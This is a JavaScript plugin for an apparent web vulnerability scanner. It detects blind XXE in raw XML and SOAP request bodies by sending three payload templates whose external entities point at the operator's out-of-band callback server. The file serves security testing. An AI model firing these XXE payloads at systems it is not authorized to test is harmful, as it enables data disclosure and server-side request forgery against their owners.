/* ---
id: xxe-xml-body-oob
name: Blind XXE via Direct XML Body (OOB)
description: Detects blind XML External Entity injection when a request body is a raw XML document, using an external parameter or general entity that points at the operator's out-of-band server and confirming only on a callback.
author: GASH contributors
severity: high
tags: [xxe, xml, soap, injection, blind, oob]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 40
phase: probe
order: 114
oob: required
api_version: "1.0"
tests: tests/fixtures/xxe-xml-body-oob/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/xxe/xxe-xml-body-oob.js
// What: Tier 2 blind-XXE plugin for raw XML and SOAP request bodies.
// Why: The existing XXE plugins approximate XML through query parameters or a
//   JSON field carrying a document. A SOAP or XML API receives the document as
//   the body itself, and the DOCTYPE has to be rebuilt around the discovered
//   field per request. Confirmed ONLY on a callback match; without an OOB
//   server the plugin sends nothing and claims nothing.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const xmlContentType = "application/xml";
  const maxSends = 40;
  const sent = [];

  const tagFor = (name) => {
    const clean = String(name || "").replace(/[^A-Za-z0-9_.-]/g, "_");
    return clean || "value";
  };
  // Single-quoted SYSTEM literals keep every builder free of double quotes.
  const builders = [
    function (tag, url) {
      return '<?xml version="1.0"?><!DOCTYPE request [<!ENTITY % p SYSTEM \'' + url +
        '\'>%p;]><request><' + tag + '>gash</' + tag + '></request>';
    },
    function (tag, url) {
      return '<?xml version="1.0"?><!DOCTYPE soap [<!ENTITY % p SYSTEM \'' + url +
        '\'>%p;]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">' +
        '<soap:Body><' + tag + '>gash</' + tag + '></soap:Body></soap:Envelope>';
    },
    function (tag, url) {
      return '<?xml version="1.0"?><!DOCTYPE request [<!ENTITY xxe SYSTEM \'' + url +
        '\'>]><request><' + tag + '>&xxe;</' + tag + '></request>';
    },
  ];

  for (const point of points) {
    if (sent.length >= maxSends) {
      break;
    }
    if (String(point.paramLocation || "").toLowerCase() !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    const tag = tagFor(point.paramName);
    for (const build of builders) {
      if (sent.length >= maxSends) {
        break;
      }
      const oob = host.oob.generate("http");
      if (!oob) {
        return []; // no OOB server: honest skip, no request, no finding
      }
      const payload = build(tag, oob.url);
      probe.send({
        url: point.url,
        method: point.method,
        paramName: "",
        paramLocation: "body",
        value: payload,
        headers: { "Content-Type": xmlContentType },
      });
      sent.push({ corr: oob.correlationId, ns: oob.namespace, point: point });
    }
  }
  if (sent.length === 0) {
    return [];
  }

  // ONE shared bounded window for the whole corpus (DNS or HTTP both count).
  const ids = [];
  for (const s of sent) {
    ids.push(s.corr);
  }
  const ev = host.oracles.oobAny(ids, sent[0].ns);
  if (!ev || ev.correlationId === undefined) {
    return [];
  }
  for (const s of sent) {
    if (s.corr === String(ev.correlationId)) {
      return [host.candidate(s.point, "oob", ev)];
    }
  }
  return [];
}
